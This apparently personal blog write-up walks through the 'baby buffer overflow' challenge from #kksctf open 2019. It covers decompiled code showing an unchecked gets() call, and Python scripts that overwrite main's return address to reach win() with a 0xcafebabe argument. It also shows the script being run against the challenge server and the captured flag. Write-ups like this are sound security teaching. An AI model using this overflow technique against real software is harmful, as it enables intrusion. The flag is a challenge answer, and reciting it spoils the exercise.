@@ -1,0 +1,250 @@
+Title : #kksctf open 2019
+Author : Aaron Yoo
+Email : atyoo99@gmail.com
+Title Note : &date;
+
+
+[TITLE]
+
+<br>
+
+Yesterday I participated casually in [#kksctf open
+2019](https://ctftime.org/event/874). This was a fun CTF put on by the
+information security department of the [MIREA](https://mirea.ru/) Cybernetics
+Institue. I had a good time solving some of the beginner
+challenges.
+
+In general, I am trying to solve as many problems as I can and have 1 or 2
+problems that I have to "reach" for, meaning that I wasn't able to solve the
+problems in competition, but solve them afterward using the solutions of others. I
+think this is one of the best ways to get better and doing only 1 or 2 problems
+per CTF will make this is a sustainable habit (hopefully). Also, I will try to
+write up 1 problem per CTF that I thought was interesting. In this CTF, I chose
+`baby buffer overflow`, a beginner buffer overflow challenge.
+
+The approach I took was more analytical that many of the solutions that I have
+seen online. While this does imply that my thought process is more reproducible,
+it also means that I solved it much slower than many. Next time, I will look to
+take a more black box approach to solving these kind of simple buffer overflow tasks.
+
+# Baby Buffer Overflow -- PWN 100
+
+[CTFTime Link](https://ctftime.org/task/10169). We are given an executable
+called `baby_bof`. Running it prompts us for a string:
+
+```{.line-numbers}
+aaron@taco:/ubuntu$ ./baby_bof
+We have prepared a buffer overflow for you
+Can you get use of it?
+Enter your name: AaBbCc
+Hello, aabbcc!
+```
+
+The program takes the string we give it and prints it back to us. All of the
+uppercase letters are changed to lowercase letters but this turns out to be not
+important. To confirm the buffer overflow just try to put a lot of A's (I have
+redacted some of the A's for visual clarity, but you get the idea):
+
+```{.line-numbers}
+We have prepared a buffer overflow for you
+Can you get use of it?
+Enter your name: AAAAAAAAAAAAAAAAAA....
+Hello, aaaaaaaaaaaaaa...
+Segmentation fault (core dumped)
+```
+
+After confirming a buffer overflow, we can open the binary up in Ghidra. The `main`
+function looks something like this:
+
+```cpp {.line-numbers}
+int main(void)
+{
+  char input_buf [252];
+  
+  ...
+  ...
+  puts("We have prepared a buffer overflow for you");
+  puts("Can you get use of it?");
+  printf("Enter your name: ");
+
+  // Call read_wrapper to get the input into input_buf
+  read_wrapper(input_buf);
+
+  // Print the input that was recieved
+  printf("Hello, %s!\n", input_buf);
+  return 0;
+}
+```
+
+We can see the program is presumably using a function called `read_wrapper` to
+put our input in `input_buf`, which is then printed back to us. The `read_wrapper`
+function looks something like this:
+
+```cpp {.line-numbers}
+void read_wrapper(char *param_1)
+{
+  size_t sVar1;
+  uint local_c;
+  
+  // Unprotected get
+  gets(param_1);
+
+  local_c = 0;
+
+  // For every character in the input
+  while( true ) {
+    sVar1 = strlen(param_1);
+    if (sVar1 <= local_c) break;
+
+    // If the letter is uppercase then convert it to lowercase
+    if (('@' < param_1[local_c]) && (param_1[local_c] < '[')) {
+      param_1[local_c] = param_1[local_c] + ' ';
+    }
+    local_c = local_c + 1;
+  }
+  return;
+}
+```
+
+Here we see the reason for the buffer overflow in an unprotected `gets(param_1)`
+call. Since the buffer is being passed in as a parameter, we cannot hijack the
+return from `read_wrapper` since the buffer is actually in the stack frame of
+`main`. This confused me for awhile, but eventually I came to the conclusion
+that we needed to control the return from `main` instead.
+
+Now came the question of: where do we want the control flow to go? Looking at
+the function list in Ghidra we can find a function called `win` that has an
+address of `0x080485f6` and looks like this:
+
+```cpp {.line-numbers}
+void win(int param_1)
+{
+  char flag_buf [29];
+  FILE *fp;
+  
+  fp = fopen("flag.txt","r");
+  if (fp == (FILE *)0x0) {
+    puts("flag not found");
+  }
+  else {
+    fgets(flag_buf, 0x1d, fp);
+    if (param_1 != -0x35014542) {
+      puts("Almost there :)");
+                    /* WARNING: Subroutine does not return */
+      exit(0);
+    }
+    printf("Here it comes: %s\n", flag_buf);
+  }
+  return;
+}
+```
+
+This is clearly where we want to go as it gives us the flag. There are some
+checks in this function that we will have to pass but let's worry first about
+getting there. In order to overflow the buffer precisely so that we can
+overwrite the return address of `main`, we can take a trial and error approach.
+According to Ghidra, the size of the input buffer is 252 bytes so we know we are going
+to need a number bigger than that. After a bunch of trial and error using gdb I
+found that in order to overwrite the address we need 260 bytes plus the 4 byte
+address.
+
+```Python
+import struct
+import sys
+
+padding = 'A' * 260
+win_addr = struct.pack("I", 0x080485f6)
+
+payload = bytes(padding, encoding='ascii') + bytes(win_addr)
+sys.stdout.buffer.write(payload)
+```
+
+Piping the output of this Python script to `baby_bof` we can see in GDB that we
+do indeed redirect the saved eip to 0x080485f6.
+
+```
+gdb-peda$ info frame
+    Stack level 0, frame at 0xffffd550:
+    eip = 0x8048783 in main; saved eip = 0x80485f6
+    ...
+```
+
+Now if we let the program run we get the infuriating message:
+
+```
+Hello, aaaaaaa....
+Almost there :)
+```
+
+Revisiting the interesting code from the `win` function:
+
+```cpp {.line-numbers}
+void win(int param_1)
+{
+    ...
+    ...
+    fgets(flag_buf, 0x1d, fp);
+    if (param_1 != 0xcafebabe) {
+      puts("Almost there :)");
+                    /* WARNING: Subroutine does not return */
+      exit(0);
+    }
+    printf("Here it comes: %s\n", flag_buf);
+    ...
+    ...
+}
+```
+
+If we look in the disassembly, we can see that the constant that is being
+compared to the parameter is `0xcafebabe` in hexidecimal. Now, all we need to do
+is to figure how much more to overflow the buffer to get overwrite this
+parameter as well. For me, this was probably the least scientific part as it is
+difficult to visualize the stack at this point since it has been smashed by our
+buffer overwrite. Looking at the solutions of CTFTime, there seems to be little
+explanation for this in terms of analytical thought. Through trial and error,
+turns out that we need to add 4 more bytes of padding then our `0xcafebabe`
+constant. Here is a Python script
+that does that:
+
+```Python
+# solve.py
+
+import struct
+import sys
+
+before_padding = 'A' * 260
+addr = struct.pack("I", 0x080485f6)
+after_padding = 'A' * 4
+param = struct.pack("I", 0xcafebabe)
+
+
+sys.stdout.buffer.write(
+    bytes(before_padding, encoding='ascii') +
+    bytes(addr) +
+    bytes(after_padding, encoding='ascii') +
+    bytes(param) +
+    bytes("\n", encoding='ascii'))
+```
+
+I am still not sure why the padding was 4 bytes. My though process was that the
+first argument on Linux x86 is at `ebp + 8`. However, it was difficult for me to
+tell where the base pointer was for `win` in relation to our buffer. Thus, I
+ended up just using trial and error for this part.
+
+Finally, we need to run our exploit on the server to get the flag:
+
+```
+$ python3 solve.py | nc tasks.open.kksctf.ru 10002
+We have prepared a buffer overflow for you
+Can you get use of it?
+Enter your name: Hello, aaaaaaa....����!
+Here it comes: kks{0v3rf10w_15_my_1!f3}
+
+/home/ctf/redir.sh: line 4:    50 Segmentation fault      timeout -k 120 120 ./chall
+```
+
+And there we have the flag: **kks{0v3rf10w_15_my_1!f3}**
+
+<br>
+<br>
+<br>
